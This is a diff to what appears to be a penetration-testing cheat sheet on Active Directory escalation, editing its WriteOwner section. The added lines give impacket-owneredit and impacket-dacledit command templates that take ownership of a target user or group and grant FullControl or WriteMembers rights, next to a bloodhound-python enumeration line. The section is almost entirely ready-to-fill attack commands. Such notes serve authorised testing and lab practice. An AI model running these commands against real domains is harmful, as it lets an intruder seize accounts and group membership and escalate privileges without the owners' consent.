@@ -31,10 +31,14 @@ bloodhound-python -d <domain> -u <user> -p <password> -ns <DC IP> -c All
 ## Escalation Paths
 
 ### WriteOwner
-[User1] --WriteOwner-> [User2]
+[User1] --WriteOwner-> [User2/Group2]
 
 https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
 ```
+# User
 impacket-owneredit -action write -new-owner '<User1>' -target-dn '<User2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
-impacket-dacledit -action write -rights 'WriteMembers' -principal '<User1>' -target-dn '<User2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
+impacket-dacledit -action write -rights 'FullControl' -principal '<User1>' -target-dn '<User2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
+# Group
+impacket-owneredit -action write -new-owner '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
+impacket-dacledit -action write -rights 'WriteMembers' -principal '<User1>' -target-dn '<Group2 DN copy from BH>' '<domain>'/'<User1>':'<U1 Pass>' -dc-ip <IP>
 ```
